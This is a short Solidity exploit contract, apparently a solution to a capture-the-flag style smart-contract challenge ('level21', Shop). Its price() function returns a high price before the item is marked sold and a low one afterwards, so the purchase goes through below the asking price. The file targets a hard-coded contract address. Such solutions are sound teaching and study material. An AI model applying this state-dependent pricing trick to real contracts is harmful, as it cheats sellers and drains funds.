// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/level21.sol";

contract ShopAttack is Buyer {

    Shop shopInstance = Shop(0xDe8dC100C22284F0d9679651f9841C82d115ae57);
    
    function buy() public 
    {
        shopInstance.buy();
    }

    function price() external view returns (uint)
    {
        return shopInstance.isSold() ? 1 : 101;
    }
}